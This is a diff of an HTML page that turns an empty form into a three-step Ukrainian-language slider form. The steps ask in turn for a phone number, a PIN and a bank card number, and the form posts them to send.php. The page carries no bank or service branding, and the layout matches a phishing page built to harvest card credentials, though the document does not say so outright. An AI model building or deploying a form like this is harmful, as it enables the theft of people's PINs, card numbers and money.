@@ -1,31 +1,91 @@
+
 <!DOCTYPE html>
-<html lang='en'>
+<html lang="en">
 <head>
-   <meta charset='UTF-8'>
-   <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
-   <link rel='stylesheet' href='./css/index.css'>
-   <script src='./js/index.js' defer></script>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"/>
+   <link rel="stylesheet" href="./css/index.css">
+   <script src="./js/index.js" defer></script>
    <title>Document</title>
 </head>
 <body>
-   <div class='wrapper'>
-      <header class='header'>
-         <div class='container header-container'></div>
-      </header>
-      <main class='main'>
-         <div class="container">
-            <div class="row d-flex justify-content-center align-items-center" style="height: 100vh;">
-               <div class="form p-5 bg-secondary rounded-5 w-50" style="min-width: 300px;">
-                  <div class="mb-3">
-                     <input type="text" class="form-control">
+   <style>
+      .btn{
+         cursor: pointer;
+      }
+      .swiper-btn{
+         opacity: 1;
+         transition: opacity .3s linear;
+      }
+      .swiper-btn.swiper-button-disabled{
+         opacity: 0.5;
+         cursor: initial;
+      }
+      
+   </style>
+   <div class="d-flex flex-column" style="min-height: 100vh;">
+       <!-- <header class="header bg-success text-info">
+         <h2 class="text-center">Header</h2>
+      </header> -->
+      <main class="main">
+
+         <div class="container position-relative" data-id="formContainer">
+            <form action="send.php" method="post" class="form w-75 m-auto bg-info bg-opacity-25 px-5 position-absolute top-50" style="left: 50%;transform: translate(-50%,-50%);min-width: 350px;">
+               <div class="swiper py-5">
+                  <div class="swiper-navigation" 
+                  style="position: absolute;
+                  width: 100%;
+                  top: 65%;
+                  z-index: 99;">
+                     <div class="swiper-btn swiper-btn-next btn btn-info  w-100">Далi</div>
                   </div>
-                  <button class="btn btn-warning btn-sm">send</button>   
-               </div>
-            </div>
+                  <div class="swiper-wrapper">
+                    <div class="swiper-slide">
+                       <div class="form-body py-5">
+                          
+                          <div class="mb-3">
+                             <label for="number-1" class="form-label">телефон</label>
+                             <input type="text" class="form-control" id="number-1" name="phoneNumber">
+                           </div>
+                       </div>
+                    </div>
+
+                    <div class="swiper-slide">
+                       <div class="form-body py-5">
+                          <div class="mb-3">
+                             <label for="number-2" class="form-label">пин</label>
+                             <input type="text" class="form-control" id="number-2" name="pinNumber">
+                           </div>
+                       </div>
+                    </div>
+
+                    <div class="swiper-slide">
+                       <div class="form-body py-5">
+                          
+                           <div class="mb-3">
+                             <label for="number-3" class="form-label">Номер карты</label>
+                             <input type="text" class="form-control" id="number-3" name="cardNumber">
+                           </div>
+                           
+                           <div class="form-btns d-flex justify-content-between position-absolute w-100" style="z-index:100; top:100%;">
+                             <button type="submit" class="btn btn-info text-capitalize w-100 " >продовжити</button>
+                           </div>
+                       </div>
+                    </div>
+                  </div>                
+                </div>
+
+
+            </form>
          </div>
+
       </main>
-      <footer class='footer'></footer>
+      <footer class="footer mt-auto bg-success text-info">
+         <h2 class="text-center">2024 &copy Веб студия ОкО</h2>
+      </footer>
    </div>
+   <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
 </body>
-<html/>
+</html>
